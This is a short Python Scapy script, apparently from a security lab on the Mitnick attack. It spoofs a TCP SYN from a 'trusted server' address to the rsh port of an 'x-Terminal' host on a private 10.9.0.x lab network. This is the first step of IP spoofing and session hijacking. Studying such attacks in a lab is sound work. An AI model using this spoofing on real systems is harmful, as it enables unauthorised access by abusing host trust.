from scapy.all import *
from scapy.layers.inet import IP, TCP
x_ip='10.9.0.5'#x-Terminal
srv_ip='10.9.0.6'# The trusted server
x_port=514 #port number used by x-Terminal

srv_port=1023#port number used by the trusted server
port_2nd=9090
syn_seq=0x1000 #Initial sequence number
# Spoof a SYN from Trusted Server to X-Terminal
ip=IP(src=srv_ip,dst=x_ip)
tcp=TCP(sport=srv_port,dport=x_port,seq=syn_seq,flags='s')
print("Sending SYN ...")
send(ip/tcp,verbose=1)
 
